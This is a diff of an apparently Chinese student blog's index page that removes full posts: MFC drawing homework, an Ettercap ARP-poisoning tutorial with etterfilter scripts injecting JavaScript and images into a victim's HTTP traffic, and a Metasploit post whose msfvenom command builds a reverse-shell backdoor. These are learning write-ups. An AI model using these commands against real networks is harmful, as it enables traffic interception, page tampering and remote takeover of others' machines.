-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//修改消息映射函数，添加使用颜色选择公用对话框</span></div><div class="line"><span class="keyword">void</span> CFunctioncurveView::OnInput() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CFunctioncurveDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	<span class="function">CColorDialog <span class="title">colordlg</span><span class="params">(pDoc-&gt;m_brush)</span></span>; 	pDoc-&gt;m_brush = RGB(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>); 	<span class="keyword">if</span>(colordlg.DoModal()== IDOK)	&#123;		pDoc-&gt;m_brush = colordlg.GetColor();	    pDoc-&gt;m_boolNew=<span class="literal">false</span>;		InvalidateRect(<span class="literal">NULL</span>);     &#125;&#125;</div></pre></td></tr></table></figure>
-</li>
-<li><p>模式选择</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//这里我在Document类声明中添加了一个model变量，用它来做选择结构</span></div><div class="line"><span class="keyword">void</span> CFunctioncurveView::OnsinFunc() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CFunctioncurveDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;model = <span class="number">0</span>;	&#125;<span class="keyword">void</span> CFunctioncurveView::OncosFunc() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CFunctioncurveDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;model = <span class="number">1</span>;&#125;</div></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>声明什么的我就不写了，下面是修改OnDraw()成员函数。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> CFunctioncurveView::OnDraw(CDC* pDC)&#123;	CFunctioncurveDoc* pDoc = GetDocument();	ASSERT_VALID(pDoc);	<span class="keyword">const</span> <span class="keyword">double</span> PI=<span class="number">3.14159265359</span>;	<span class="keyword">const</span> <span class="keyword">double</span> dbYMax=<span class="number">1.0</span>;	<span class="keyword">const</span> <span class="keyword">double</span> dbYMin=<span class="number">-1.0</span>;	<span class="keyword">const</span> <span class="keyword">double</span> dbXMin=<span class="number">0.0</span>;	<span class="keyword">const</span> <span class="keyword">double</span> dbXMax=<span class="number">2</span>*PI;	<span class="keyword">const</span> <span class="keyword">int</span> iPt = <span class="number">200</span>;	<span class="keyword">const</span> <span class="keyword">int</span> xOrg = <span class="number">50</span>;	<span class="keyword">const</span> <span class="keyword">int</span> yOrg = <span class="number">350</span>;	<span class="keyword">const</span> <span class="keyword">int</span> xMax = <span class="number">700</span>;	<span class="keyword">const</span> <span class="keyword">int</span> yMin = <span class="number">20</span>;	<span class="keyword">double</span> dbXRatio=(xMax-xOrg)/(dbXMax-dbXMin);    <span class="keyword">double</span> dbYRatio=(yOrg-yMin)/(dbYMax-dbYMin);    <span class="keyword">int</span> x = xOrg;    <span class="keyword">int</span> y = yOrg;	<span class="keyword">if</span>(!pDoc-&gt;m_boolNew) <span class="comment">//声明的m_boolNew是为了让新建文档为空白视图</span>	&#123;	    		pDC-&gt;MoveTo(x,y);	    CPen penNew,*ppenOld; 	   	penNew.CreatePen(PS_SOLID,<span class="number">2</span>,pDoc-&gt;m_brush);	    ppenOld=pDC-&gt;SelectObject(&amp;penNew); <span class="comment">//选择画笔颜色</span>		<span class="keyword">if</span>(pDoc-&gt;model == <span class="number">0</span>) <span class="comment">//判断画正弦还是余弦</span>		&#123;    	    <span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>;i &lt;= iPt; i++)			&#123;	  	          x = (<span class="keyword">int</span>)(dbXRatio*(dbXMax/iPt*i-dbXMin)+xOrg);		      y = (<span class="keyword">int</span>)(yOrg-dbYRatio*(<span class="built_in">sin</span>(dbXMax/iPt*i)-dbYMin));		      pDC-&gt;LineTo(x,y);			&#125;		&#125;		<span class="keyword">else</span>		&#123;	        <span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>;i &lt;= iPt; i++)			&#123;	  		      x = (<span class="keyword">int</span>)(dbXRatio*(dbXMax/iPt*i-dbXMin)+xOrg);		      y = (<span class="keyword">int</span>)(yOrg-dbYRatio*(<span class="built_in">cos</span>(dbXMax/iPt*i)-dbYMin));		      pDC-&gt;LineTo(x,y);			&#125;		 		&#125;		pDC-&gt;SelectObject(ppenOld);		penNew.DeleteObject();<span class="comment">//用完画笔后要及时销毁，否则再次创建的时候会报错</span>		pDC-&gt;MoveTo(xOrg,yOrg);		pDC-&gt;LineTo(xMax,yOrg);		pDC-&gt;MoveTo(xOrg,yOrg);		pDC-&gt;LineTo(xOrg,yMin);		x=(xMax-xOrg)/<span class="number">2</span>;		y=yOrg+<span class="number">10</span>;        pDC-&gt;TextOut(x,y,<span class="string">"X"</span>);		x=xOrg<span class="number">-20</span>;		y=(yOrg-yMin)/<span class="number">2</span>;		pDC-&gt;TextOut(x,y,<span class="string">"Y"</span>);	&#125;	<span class="keyword">else</span> 	&#123;		CRect rectClient;		GetClientRect(rectClient);		pDC-&gt;FillSolidRect(rectClient,RGB(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>));	&#125;	<span class="comment">// <span class="doctag">TODO:</span> add draw code for native data here</span>&#125;</div></pre></td></tr></table></figure></p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这个题用的时间比较长的原因有有两个:第一个问题在于我错误的认为brush是pen，然后搞brush类半天什么也画不出来。还有一个问题就是我在给sin/cos创建消息映射函数的时候把成员函数的名字作死命名为sin/cos，后来将math.h包括进来的时候编译器报错,因为我重复定义了sin和cos……还是很感谢<a href="http://lyeec.me" target="_blank" rel="external">@Lyeec</a>帮我找出了问题所在(<em>_</em>)</p>
-
-          
+<li><p>这个看起来如此简单的东西耗费了我半天的时间ಥ_ಥ，大部分时间用在了调一个令人无语的bug上。</p>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/11/17/2015-11-17-mfc/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1101,28 +1019,14 @@ GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<sp
 
       
         
-          
-            <p>##MFC的作业</p>
+          <p>##MFC的作业</p>
 <ul>
-<li>设计基于单文档/视图结构的程序。绘制一条直的道路，然后然后设计一个小车（矩形代替，有车号），使其沿道路匀速行走，到终点自动返回，来回行走。道路的宽度、长度由设定菜单完成；还有开始、结束菜单；有高速、中速、低速三个菜单控制小车速度。</li>
-<li>简要分析下：主要用到的知识有：单文档界面(SDI)应用程序，利用ClassWizard编制消息处理函数，定时器消息，客户区重绘等等……</li>
-<li>实现    </li>
-</ul>
-<p>修改文档类的定义，添加成员变量：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> CCarsDoc : <span class="keyword">public</span> CDocument&#123;<span class="keyword">protected</span>: <span class="comment">// create from serialization only</span>	CCarsDoc();	DECLARE_DYNCREATE(CCarsDoc)<span class="comment">// Attributes</span><span class="keyword">public</span>:   CRect m_rectCar;   <span class="keyword">int</span> speed;<span class="comment">// Operations</span><span class="keyword">public</span>:<span class="comment">// Overrides</span></div></pre></td></tr></table></figure></p>
-<p>在CCarsDoc的成员函数OnNewDocument()中初始化数据:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BOOL CCarsDoc::OnNewDocument()&#123;	<span class="keyword">if</span> (!CDocument::OnNewDocument())		<span class="keyword">return</span> FALSE;     m_rectCar=CRect(<span class="number">100</span>,<span class="number">100</span>,<span class="number">180</span>,<span class="number">150</span>);	 <span class="keyword">int</span> speed = <span class="number">1</span>;	 m_boolNew=<span class="literal">true</span>;	 m_Length=<span class="number">0</span>;	 m_Width=<span class="number">0</span>;	<span class="comment">// <span class="doctag">TODO:</span> add reinitialization code here</span>	<span class="comment">// (SDI documents will reuse this document)</span>    <span class="keyword">return</span> TRUE;&#125;</div></pre></td></tr></table></figure></p>
-<p>再通过资源编辑器中的菜单编辑器完成菜单的编辑，使用ClassWizard生成消息处理函数，并自动添加菜单消息和消息处理函数的映射，在消息处理函数中加入代码:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> CCarsView::Onstart() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	CRect rectClient;	GetClientRect(&amp;rectClient);	SetTimer(<span class="number">1</span>,<span class="number">100</span>,<span class="literal">NULL</span>);		&#125;<span class="keyword">void</span> CCarsView::OnTimer(UINT nIDEvent) &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span></div><div class="line">	CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	InvalidateRect(pDoc-&gt;m_rectCar,TRUE);	<span class="keyword">static</span> <span class="keyword">int</span> flag = <span class="number">1</span>;	<span class="keyword">if</span>(pDoc-&gt;m_rectCar.right &gt; pDoc-&gt;m_Length || pDoc-&gt;m_rectCar.left &lt; <span class="number">50</span>)	&#123;		flag *= <span class="number">-1</span>;	&#125;	    pDoc-&gt;m_rectCar.left += pDoc-&gt;speed*flag;	pDoc-&gt;m_rectCar.right += pDoc-&gt;speed*flag;		InvalidateRect(pDoc-&gt;m_rectCar,FALSE);	CView::OnTimer(nIDEvent);	&#125;<span class="keyword">void</span> CCarsView::Onstop() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	KillTimer(<span class="number">1</span>);&#125;<span class="keyword">void</span> CCarsView::Onhigh() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>    CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;speed=<span class="number">10</span>;&#125;<span class="keyword">void</span> CCarsView::Onmedium() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);    pDoc-&gt;speed=<span class="number">5</span>;&#125;<span class="keyword">void</span> CCarsView::Onlow() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>    CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;speed=<span class="number">1</span>;&#125;<span class="keyword">void</span> CCarsView::OnMenuitem32777() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	CCarsDlg dlginput;	<span class="keyword">int</span> nRet = dlginput.DoModal();	<span class="keyword">if</span>(nRet = IDOK)	&#123;		pDoc-&gt;m_Length=dlginput.m_Length;		pDoc-&gt;m_Width=dlginput.m_Width;		pDoc-&gt;m_boolNew=<span class="literal">false</span>;		Invalidate();	&#125;&#125;</div></pre></td></tr></table></figure></p>
-<p>然后在OnDraw()里绘制小车和跑道:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> CCarsView::OnDraw(CDC* pDC)&#123;	CCarsDoc* pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDC-&gt;Rectangle(pDoc-&gt;m_rectCar);	pDC-&gt;MoveTo(<span class="number">50</span>,<span class="number">50</span>);	pDC-&gt;LineTo(pDoc-&gt;m_Length,<span class="number">50</span>);	pDC-&gt;MoveTo(<span class="number">50</span>,<span class="number">50</span>+(pDoc-&gt;m_Width));	pDC-&gt;LineTo(pDoc-&gt;m_Length,<span class="number">50</span>+(pDoc-&gt;m_Width));		<span class="comment">// <span class="doctag">TODO:</span> add draw code for native data here</span>&#125;</div></pre></td></tr></table></figure></p>
-<ul>
-<li>设计一个具有一定外形和颜色的计数器。开始结束由鼠标控制。   </li>
-<li>实现:</li>
-</ul>
-<p>修改文档类的定义，添加成员变量:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> CCountDoc : <span class="keyword">public</span> CDocument&#123;<span class="keyword">protected</span>: <span class="comment">// create from serialization only</span>	CCountDoc();	DECLARE_DYNCREATE(CCountDoc)<span class="comment">// Attributes</span><span class="keyword">public</span>:	<span class="keyword">int</span> m_iCount;<span class="comment">// Operations</span><span class="keyword">public</span>:<span class="comment">// Overrides..... 省略以下</span></div></pre></td></tr></table></figure></p>
-<p>在成员函数OnNewDocument()中初始化数据:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">m_iCount = <span class="number">0</span>;</div></pre></td></tr></table></figure></p>
-<p>使用ClassWizaid生成消息处理函数,鼠标左键开始计数，右键停止计数:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> CCountView::OnLButtonDown(UINT nFlags, CPoint point) &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>	SetTimer(<span class="number">1</span>,<span class="number">100</span>,<span class="literal">NULL</span>);	CView::OnLButtonDown(nFlags, point);&#125;<span class="keyword">void</span> CCountView::OnRButtonDown(UINT nFlags, CPoint point) &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>	KillTimer(<span class="number">1</span>);	CView::OnRButtonDown(nFlags, point);&#125;<span class="keyword">void</span> CCountView::OnTimer(UINT nIDEvent) &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>    CCountDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;m_iCount++;	Invalidate();	CView::OnTimer(nIDEvent);&#125;</div></pre></td></tr></table></figure></p>
-<p>对了，绘图的时候要有颜色:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> CCountView::OnDraw(CDC* pDC)&#123;	CCountDoc* pDoc = GetDocument();	ASSERT_VALID(pDoc);	CString strDisplay;	CPen penBlue;	penBlue.CreatePen(PS_SOLID,<span class="number">3</span>,RGB(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>));	strDisplay.Format (<span class="string">"Current number:%d"</span>,pDoc-&gt;m_iCount);	pDC-&gt;SetTextColor(RGB(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>));	pDC-&gt;SelectObject(&amp;penBlue);	pDC-&gt;Rectangle(<span class="number">50</span>,<span class="number">50</span>,<span class="number">280</span>,<span class="number">180</span>);	pDC-&gt;TextOut(<span class="number">100</span>,<span class="number">100</span>,strDisplay);	<span class="comment">// <span class="doctag">TODO:</span> add draw code for native data here</span>&#125;</div></pre></td></tr></table></figure></p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>我要检讨一下自己当时小学期的时候没有好好学习MFC，很多东西都不记得了。在编写这两个程序的过程中还遇到了很多问题，比如让小车往返运动的问题，请教了<a href="http://lyeec.me" target="_blank" rel="external">@Lyeec</a>。还有，我一定要养成随手写注释的习惯。</p>
-
-          
+<li>设计基于单文档/视图结构的程序。绘制一条直的道路，然后然后设计一个小车（矩形代替，有车号），使其沿道路匀速行走，到终点自动返回，来回行走。道路的宽度、长度由设定菜单完成；还有开始、结束菜单；有高速、中速、低速三个菜单控制小车速度。
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/11/16/2015-11-16-mfc/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1232,26 +1136,12 @@ GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<sp
 
       
         
-          
-            <h1 id="Ettercap简介："><a href="#Ettercap简介：" class="headerlink" title="Ettercap简介："></a>Ettercap简介：</h1><p>ettercap是一个进行中间人攻击的全面工具套装，它可以嗅探数据和玩一些其他有意思的把戏…… 我从官网介绍上随意翻译的=_=</p>
-<h1 id="一次中间人攻击实例"><a href="#一次中间人攻击实例" class="headerlink" title="一次中间人攻击实例"></a>一次中间人攻击实例</h1><ul>
-<li>工具： Ettercap Wireshark </li>
-<li>攻击者：Mac OS X 10.10.5</li>
-<li>目标：iPhone （iOS 9.1）<h2 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h2>打开内核ip转发功能，否则会导致被攻击的对象无法上网。在终端里输入<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo sysctl net.inet.ip.forwarding=<span class="number">1</span></div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>终端提示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net.inet.ip.forwarding: <span class="number">0</span> -&gt; <span class="number">1</span></div></pre></td></tr></table></figure></p>
-<p>这样就可以开始进行ARP毒化和中间人攻击了。(注意：这是Mac OS X系统的命令，Linux系统请自行Google)</p>
-<h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><h3 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h3><p>ettercap提供了四种用户界面<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Text Only – ‘-T’ option</div><div class="line">Curses – ‘-C’ option</div><div class="line">GTK – ‘-G’ option</div><div class="line">Daemon – ‘-D’ option</div></pre></td></tr></table></figure></p>
-<p>我使用的是命令行模式，感觉它UI做的好丑。<br>下面是ARP毒化的指令<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ettercap -T -q -i en0 -M ARP:remote /<span class="number">192.168</span><span class="number">.1</span><span class="number">.4</span>/ /<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>/</div></pre></td></tr></table></figure></p>
-<p>T参数是Text Only，q参数是安静模式，M参数表示MITM即中间人攻击。192.168.1.4是iPhone的ip地址，192.168.1.1是路由的ip地址。<br>  使用该命令后，攻击开始，按q键结束。同时打开Wireshark即可看到目标访问的所有http链接的明文内容。如下图所示：<img src="http://ww1.sinaimg.cn/mw690/005WMcFzgw1exyg0unp7oj311t0np479.jpg" alt=""></p>
-<h3 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h3><p>在ettercap可以使用自己编写的插件来实现一些功能，当然ettercap也提供了一些插件。在/usr/local/bin/目录下用vim新建.filter文件。<br>我们先尝试注入代码让目标浏览网页时弹窗，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (ip.proto == TCP &amp;&amp; tcp.dst == <span class="number">80</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (search(DATA.data, <span class="string">"Accept-Encoding"</span>))</div><div class="line">    &#123;</div><div class="line">        replace(<span class="string">"Accept-Encoding"</span>, <span class="string">"Accept-Rubbish!"</span>);</div><div class="line">        <span class="meta"># note: replacement string is same length as original string</span></div><div class="line">        msg(<span class="string">"zapped Accept-Encoding!\n"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (ip.proto == TCP &amp;&amp; tcp.src == <span class="number">80</span>)</div><div class="line">&#123;</div><div class="line">    replace(<span class="string">"&lt;head&gt;"</span>, <span class="string">"&lt;head&gt;&lt;script type="</span>text/javascript<span class="string">"&gt;alert('test');&lt;/script&gt;"</span>);</div><div class="line">    replace(<span class="string">"&lt;HEAD&gt;"</span>, <span class="string">"&lt;HEAD&gt;&lt;script type="</span>text/javascript<span class="string">"&gt;alert('test');&lt;/script&gt;"</span>);</div><div class="line">    msg(<span class="string">"Injecting OK!!\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>接着在终端中输入：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">etterfilter window.filter -o windowtest3.ef</div></pre></td></tr></table></figure></p>
-<p>简单解释下，可以输入etterfilter -h来获得帮助，o参数是输出文件名。<br>效果如下图所示：<br><img src="http://ww1.sinaimg.cn/mw690/005WMcFzgw1exyg212emhj30hs0vkah0.jpg" alt=""><br>再尝试下替换网页的图片试试，还是和上面一样直接上源码；<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (ip.proto == TCP &amp;&amp; tcp.dst == <span class="number">80</span>) &#123;</div><div class="line">   <span class="keyword">if</span> (search(DATA.data, <span class="string">"Accept-Encoding"</span>)) &#123;</div><div class="line">      replace(<span class="string">"Accept-Encoding"</span>, <span class="string">"Accept-Rubbish!"</span>);</div><div class="line">      msg(<span class="string">"zapped Accept-Encoding!\n"</span>);</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (ip.proto == TCP &amp;&amp; tcp.src == <span class="number">80</span>) &#123;</div><div class="line">   replace(<span class="string">"img src="</span>, <span class="string">"img src=\"http://img5.duitang.com/uploads/item/201507/22/20150722212458_YrGtd.jpeg\" "</span>);</div><div class="line">   replace(<span class="string">"IMG SRC="</span>, <span class="string">"img src=\"http://img5.duitang.com/uploads/item/201507/22/20150722212458_YrGtd.jpeg\" "</span>);</div><div class="line">   msg(<span class="string">"Filter Ran.\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>我找了个小埋的图片233，看看效果；<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzgw1exyg1u3hdsj30hs0vktdi.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/mw690/005WMcFzgw1exyg1or9cbj30hs0vk13q.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzgw1exyg10kyknj30hs0vkdv6.jpg" alt=""><br>还可以通过插件来替换对方的下载内容，配合Metasploit生成后门甚至可以完全控制目标计算机。我还没测试过是否能用……</p>
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>中间人攻击和中间人毒化利用了ARP(地址解析协议)的固有漏洞，操作简单但是危害极大，原来我一直是主张计算机裸奔党，从来不用杀软。然而对于小白来说，喜欢乱点的同学们，你们真的需要杀毒软件来保护你们的电脑不被入侵。杀毒软件弹个窗请看清楚再关……<br>对了，突然想起来https协议就算是用ettercap＋Wireshark也是看不到传输内容的，但是通过sslstrip就可以突破ssl获取密码了，以后有时间再进行测试吧，今天就写到这里。</p>
-
-          
+          <h1 id="Ettercap简介："><a href="#Ettercap简介：" class="headerlink" title="Ettercap简介："></a>Ettercap简介：</h1><p>ettercap是一个进行中间人攻击的全面工具套装，它可以嗅探数据和玩一些其他有意思的把戏…… 我从官网介绍上随意翻译的=_=<br>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/11/12/2015-11-12-ARP/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1361,42 +1251,13 @@ GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<sp
 
       
         
-          
-            <ul>
-<li>还是写在文前：怎么说呢，折腾这个东西我的内心是很复杂的。一个美好的用来写模电和概率和大物的周日就这么没了ˊ_&gt;ˋ哎呀，可是人家就是这么执着的跳坑怎么破。还是和以往一样，这篇文章的相关技术仅供学习，千万不要做出一些危险出格的事情。</li>
-</ul>
-<h3 id="Metasploit的安装"><a href="#Metasploit的安装" class="headerlink" title="Metasploit的安装"></a>Metasploit的安装</h3><p>这一部分真的是让我的心都碎了，也是最难折腾的。在YouTube上面找了好多视频，永远都是人家一路回车，我一路报错，果然是人品用完的节奏。闲话少说，开始安装，我的系统是Mac OS X 10.10.5，一般大家都是用BT5干这种活啦。</p>
-<ol>
-<li>从Github上克隆Metasploit项目<br>选一个合适的目录，然后在终端里面输入:  </li>
-</ol>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone git@github.com:rapid7/metasploit-framework.git</div></pre></td></tr></table></figure>
-<p>之后把终端cd到你刚才选择的目录，输入:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfconsole</div></pre></td></tr></table></figure></p>
-<p>报错就对了，因为你没有装蛋疼的依赖环境。</p>
-<ol>
-<li>安装依赖环境<br>2.1 <em>Ruby</em><br>因为我是Mac系统又安装了Xcode，所以已经有了Ruby 1.8的环境，但是后续安装会要求更高的版本，所以我们先更新一下Ruby，推荐使用rvm，具体参见<a href="http://www.inferjay.com/blog/2013/05/09/how-to-install-ruby-1-dot-9-3-in-mac-osx/" target="_blank" rel="external">脉脉不得语的技术博客</a><br>2.2 <em>Homebrew</em><br>这玩意是个OS X的软件管理器，相当好用，我们使用Ruby命令来安装它，下面的安装会用到。<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -e <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"</span></div></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>我们作死运行下Metasploit，发现还是报错，具体报什么错我也忘记了（哭）。<br>2.3 <em>Nmap</em><br>强大的嗅探器，使用我们刚刚装好的homebrew安装：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">brew install nmap</div><div class="line">```    </div><div class="line"><span class="number">2.4</span> *bundler*  </div><div class="line">就是这货坑死人不偿命，按照教程来说，只需要简单的一句指令：</div><div class="line">```c</div><div class="line">gem install bundler</div></pre></td></tr></table></figure></p>
-<p>我猜你们一定会在安装到nokogiri的时候报错，事实就是这玩意需要自己手动安装，报错提示libiconv is missing，解决方案：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">brew update</div><div class="line">xcode-select --install</div><div class="line">brew link libiconv--force</div><div class="line">gem install nokogiri -- --with-iconv-dir=/usr/local/Cellar/libiconv/<span class="number">1.14</span></div></pre></td></tr></table></figure></p>
-<p>再次使用gem install bundler</p>
-<ol>
-<li>安装postgresql并配置。<br>这个我不会-_-#，因为我发现不配置数据库的话Metasploit已经可以使用了，不用数据库的视频教程见<a href="https://www.youtube.com/watch?v=C2CEQupM2PM" target="_blank" rel="external">YouTube</a>.我基本上是按照他的顺序安装的。<br>关于配置数据库的教程：<a href="http://www.freebuf.com/articles/system/36924.html" target="_blank" rel="external">RickGrey</a>(中文教程)、<a href="http://www.darkoperator.com/installing-metasploit-framewor/" target="_blank" rel="external">Darkoperator</a>(英文教程)。<br>其他的相关问题可以在官方的论坛<a href="https://community.rapid7.com/community/metasploit" target="_blank" rel="external">RAPID7COMMUNITY</a>上交流。   </li>
-</ol>
-<h3 id="一次简单的内网渗透"><a href="#一次简单的内网渗透" class="headerlink" title="一次简单的内网渗透"></a>一次简单的内网渗透</h3><ul>
-<li>工具：Mac OS X with Metasploit(Attacker)  Windows 7(Victim)</li>
-<li>原理：通过msfpayload生成后门exe然后上传到目标机器上执行，通过本地监听获得meterpreter shell，并得到shell<h4 id="生成一个backdoor-exe"><a href="#生成一个backdoor-exe" class="headerlink" title="生成一个backdoor.exe"></a>生成一个backdoor.exe</h4>Windows:<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./msfvenom windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt; backdoor.exe</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>几点说明：如果被攻击的计算机和你在同一局域网下，可以使用LAN IP，用ifconfig即可，如果是WAN攻击则使用WAN IP即可。<br>如果运行sudo ./msfvenom终端提示你安装bundler，自求多福吧，我也不知道怎么解决的。耗了一下午反复装了无数遍最后居然莫名其妙的好了。<br>这里使用的msfvenom是因为软件更新，原先的msfpayload功能已经集成在了msfvenom里了。</p>
